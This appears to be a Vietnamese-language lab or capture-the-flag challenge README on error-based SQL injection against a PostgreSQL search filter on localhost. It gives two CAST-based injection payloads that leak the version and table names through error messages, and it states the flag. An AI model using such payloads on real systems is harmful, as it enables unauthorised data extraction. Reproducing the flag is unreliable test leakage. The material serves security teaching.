# SQLi-017: PostgreSQL CAST Error-based

## 🎯 Mục Tiêu
Sử dụng **CAST to numeric** để trigger error và extract data trong PostgreSQL.

## 📝 Kịch Bản
Search filter với PostgreSQL backend.

**URL:** `http://localhost:5017/search?q=test`

## 🎓 Kiến Thức
```sql
' AND 1=CAST(version() AS numeric)--
' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS int)--
```
Error: `invalid input syntax for type numeric: "xxx"`

## 🏁 Flag
`FLAG{p0stgr3sql_c4st_3rr0r}`
